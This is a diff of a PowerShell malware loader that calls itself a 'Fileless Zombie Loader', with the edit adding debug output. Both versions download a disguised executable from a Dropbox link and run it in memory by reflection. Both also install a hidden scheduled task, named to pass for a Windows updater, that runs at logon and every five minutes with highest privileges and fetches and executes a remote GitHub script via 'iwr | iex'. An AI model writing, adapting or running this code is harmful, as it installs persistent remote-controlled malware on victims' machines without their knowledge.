@@ -1,55 +1,58 @@
 # ==========================================
-# FILELESS ZOMBIE LOADER (RAM ONLY)
+# FILELESS ZOMBIE LOADER (DEBUG MODE)
 # ==========================================
 
-# 1. SETTINGS
 $PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
 $LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
 $TaskName   = "MicrosoftWindowsUpdater"
 
-# 2. FILELESS EXECUTION (The "First Step")
-# Tries to run the payload in memory without touching the disk.
+Write-Host "🔍 [DEBUG] Starting Loader..." -ForegroundColor Cyan
+
+# 1. FILELESS EXECUTION
 function Run-Fileless {
+    Write-Host "   [STEP 1] Attempting Fileless Execution (RAM Only)..." -ForegroundColor Yellow
     try {
-        # Download bytes to RAM
         $wc = New-Object System.Net.WebClient
         $bytes = $wc.DownloadData($PayloadUrl)
+        Write-Host "      + Payload Downloaded ($(("{0:N2}" -f ($bytes.Length/1MB))) MB)" -ForegroundColor Gray
         
-        # Load into Memory (Reflection)
         $assembly = [System.Reflection.Assembly]::Load($bytes)
+        Write-Host "      + Assembly Loaded into Memory." -ForegroundColor Gray
         
-        # Run the EXE from Memory
         $entryPoint = $assembly.EntryPoint
         if ($entryPoint) {
+            Write-Host "      + Invoking EntryPoint..." -ForegroundColor Green
             $entryPoint.Invoke($null, $null)
+            Write-Host "      ✅ SUCCESS: Payload Running in RAM." -ForegroundColor Green
+        } else {
+             Write-Host "      ❌ ERROR: No EntryPoint found in EXE." -ForegroundColor Red
         }
     } catch {
-        # If execution fails (or runs continuously), just exit quietly.
-        # This catch block keeps the script from crashing nicely.
+        Write-Host "      ❌ FAILED: $($_.Exception.Message)" -ForegroundColor Red
     }
 }
 
-# 3. PERSISTENCE CHECK (The "Zombie" Loader)
-# Checks if the persistence task exists. If not, it creates it.
+# 2. PERSISTENCE CHECK
 $TaskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
 
-if (-not $TaskExists) {
-    # Create the Action: Run PowerShell -> Download GitHub Script -> Run It
-    # We use single quotes inside double quotes to handle syntax correctly.
-    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$LoaderUrl' | iex`""
-    
-    # Triggers: At Startup AND Every 5 Minutes
-    $Trigger1 = New-ScheduledTaskTrigger -AtLogon
-    $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
-    
-    # Settings: Run as USERS (Interactive), Hidden, Highest Privileges
-    $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
-    $Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-    
-    # Register the Task
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
+if ($TaskExists) {
+    Write-Host "   [STEP 2] Persistence Task '$TaskName' ALREADY EXISTS." -ForegroundColor Green
+} else {
+    Write-Host "   [STEP 2] Installing Persistence Task '$TaskName'..." -ForegroundColor Yellow
+    try {
+        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$LoaderUrl' | iex`""
+        $Trigger1 = New-ScheduledTaskTrigger -AtLogon
+        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
+        $Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+        
+        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
+        Write-Host "      ✅ SUCCESS: Task Created (Runs at Logon + Every 5 Mins)." -ForegroundColor Green
+    } catch {
+        Write-Host "      ❌ FAILED to Create Task: $($_.Exception.Message)" -ForegroundColor Red
+    }
 }
 
-# 4. EXECUTE
-# Run the fileless payload now.
+# 3. EXECUTE
 Run-Fileless
+Write-Host "🔍 [DEBUG] Script Finished." -ForegroundColor Cyan
